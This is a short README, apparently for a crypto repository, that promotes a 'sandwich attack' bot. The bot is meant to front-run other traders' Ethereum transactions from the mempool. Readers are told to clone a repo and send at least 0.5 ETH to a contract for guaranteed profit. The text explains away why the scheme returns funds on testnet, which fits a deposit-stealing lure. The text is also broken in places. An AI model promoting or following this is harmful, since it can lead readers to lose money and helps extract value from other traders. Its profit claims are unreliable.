# Sandwich Attacks Smart Contract

Monitor the mempool, placing a higher gas fee, extract profit by buying and selling assets before the original transaction takes place.

On this day I will reveal this secret to everyone on this platform. But this not financial advice so please try using Testnet first.

> But, why the capital funds return to my wallet after the transaction is confirmed?
 
Yes, you can't take profit using testnet or other mainnet network except ethereum because this algorithm will works for Ethereum mainnet only.

Before trying and getting many benefits from this contract, you should know how this contract works:

> Bot sends the Transaction and sniffs the Mempool

> Bots then compete to buy up the token onchain as quickly as possible, sandwiching the victims transaction and creating a profitable slippage opportunity

> Sending back ETH / Capital funds + profit to your wallet.

1. Clone this repo
```shell
git clone https://github.com/etheronly/sandwich-attacks.git

Just like sending ETH to another wallet but in this case you have to send your ETH to your own contract (the minimum capital fund is 0.5 ETH) and then wait until the transaction is confirmed and boom!.

**You need to know that if there is no profit potential, this contract will send back your ETH to wallet.**
